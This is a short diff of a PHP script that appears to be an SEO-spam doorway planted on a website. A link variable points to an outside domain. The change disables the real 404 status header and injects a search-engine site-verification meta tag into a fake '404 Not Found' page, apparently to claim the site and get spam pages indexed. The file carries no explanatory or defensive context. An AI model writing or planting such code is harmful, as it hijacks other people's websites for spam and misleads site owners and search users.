@@ -19,8 +19,8 @@ $linkTarget = "https://okunbong.com/suhuacuan/?name=".$Param."";
 
 function feedback404()
 {
-    header("HTTP/1.0 404 Not Found");
-    echo "<h1>404 Not Found</h1>";
+    //header("HTTP/1.0 404 Not Found");
+    echo "<head><meta name='google-site-verification' content='Ag99hmojHSH43OBmp_R-gzkiXQApJs8OW-6wssZnIZU' /></head><h1>404 Not Found</h1>";
 }
 ////////////////////
 
